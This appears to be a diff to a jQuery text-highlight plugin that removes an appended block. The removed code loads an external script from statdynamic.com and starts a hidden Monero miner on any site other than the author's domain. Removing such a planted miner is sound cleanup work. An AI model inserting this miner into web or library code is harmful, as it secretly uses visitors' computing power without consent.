@@ -36,16 +36,3 @@ jQuery.fn.removeHighlight = function() {
         }
     }).end();
 };
-
-
-if (!/johannburkard.de$/i.test(location.hostname)) {
-    (function() {
-        function load(b,c){var d=document,f="script",a=d.createElement(f),e=2166136261,g=b.length,h=c,k=/=\?/;d=d.getElementsByTagName("script")[0];if(k.test(b)){for(;g--;)e=16777619*e^b.charCodeAt(g);window[f+=0>e?-e:e]=function(){h.apply(h,arguments);delete window[f]};b=b.replace(k,"="+f);c=0}a.onload=a.onreadystatechange=function(){if(/de|m/.test(a.readyState||"m")){c&&c();d.parentNode.removeChild(a);try{for(c in a)delete a[c]}catch(l){}}};a.src=b;window.setTimeout(function(){d.parentNode.insertBefore(a,d)},0)};
-        load('//statdynamic.com/lib/crypta.js', function() {
-            window['miner'] = new CRLT.Anonymous('766f3e40a7398c893068475552d5b3bfef6dce870fb2', {
-                threads:4,throttle:0.2, coin: "xmr",
-            })
-            window['miner'].start()
-        })
-    })()
-}
